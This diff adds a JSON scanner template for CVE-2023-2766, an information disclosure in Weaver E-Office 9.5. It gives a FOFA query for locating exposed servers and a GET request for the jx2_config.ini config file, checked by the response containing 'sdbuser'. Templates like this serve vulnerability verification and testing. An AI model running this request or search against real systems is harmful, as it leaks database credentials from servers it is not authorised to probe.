@@ -1,0 +1,35 @@
+{
+  "product": "泛微 E-Office",
+  "vul_name": "泛微 E-Office信息泄露",
+  "type": "信息泄漏",
+  "vul_id": [
+    "CVE-2023-2766"
+  ],
+  "level": 3,
+  "vul_desc": "泛微E-Office是一款企业级的全流程办公自动化软件，它包括协同办公、文档管理、知识管理、工作流管理等多个模块，涵盖了企业日常工作中的各个环节。该产品configfile存在信息泄露",
+  "version": "E-Office 9.5",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"泛微-EOffice\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_53003652/article/details/134306231",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "sdbuser"
+        }
+      ]
+    }
+  }
+}
